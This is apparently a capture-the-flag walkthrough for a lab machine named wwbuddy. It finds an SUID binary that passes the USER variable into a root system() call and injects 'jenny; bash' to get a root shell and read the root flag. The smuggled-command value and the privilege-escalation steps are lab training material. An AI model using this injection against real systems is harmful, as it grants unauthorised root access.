Privilege Escalation to root
SUID Binary Analysis
Running find / -perm -u=s -type f 2>/dev/null reveals an unusual SUID binary: /bin/authenticate.

Transfer it to your attacking machine for analysis:

bash
# On victim
cd /bin
python3 -m http.server 8000

# On attacker
wget http://wwbuddy.thm:8000/authenticate
Open in Ghidra or strings. The decompiled code shows:

c
else {
  __src = getenv("USER");
  _Var1 = getuid();
  setuid(0);
  builtin_strncpy(local_48,"usermod -G developer ",0x16);
  local_48[0x16] = '\0';
  // ...
  strncat(local_48, __src, 0x20);
  system(local_48);
}
Vulnerability: The binary reads the USER environment variable and concatenates it into a command string usermod -G developer <USER>, then executes it with system(). Because setuid(0) is called, the command runs as root.

We can exploit this by setting USER to a malicious payload that breaks out of the intended command.

Exploitation
bash
export USER="jenny; bash"
/bin/authenticate
The executed command becomes:

text
usermod -G developer jenny; bash
This spawns a root shell.

bash
root@wwbuddy:/bin# id
uid=0(root) gid=1002(jenny) groups=1002(jenny)
Root Flag:

bash
cat /root/root.txt
